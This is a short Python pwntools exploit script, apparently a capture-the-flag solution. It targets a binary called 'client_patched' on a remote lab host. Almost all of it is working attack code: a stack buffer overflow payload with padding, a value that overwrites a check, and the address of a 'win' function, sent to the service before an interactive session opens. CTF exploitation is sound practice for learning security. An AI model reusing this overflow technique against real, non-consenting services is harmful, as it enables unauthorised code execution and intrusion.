from pwn import *

# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if (args.LOCAL):
        if (args.GDB):
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(' ')[0]
    port = int(conn.split(' ')[1])

    return remote(host, port)
        
if (args.DEBUG):
    context.log_level = "debug"

context.terminal = [
    'kitty', '@', 'launch',
    '--type', 'window',
    '--location', 'vsplit',
    'sh', '-c'
]


elf = "./client_patched"
if (elf != ""):
    elf = context.binary = ELF(elf)

libc = ""
if (libc != ""):
    libc = ELF(libc, checksec=False)
if (args.LOCAL):
    libc = elf.libc

script = """
    b* main+94
    b* main+232
    c
"""

conn = "sisterlab.id 42002"
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

payload = b'stop'
payload += b'A' * (0x40 - 4 + 8)
payload += p64(0xc0deab1e)
payload += b'B' * 8
payload += p64(elf.sym['win'])

io.sendlineafter(b'> ', payload)

# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
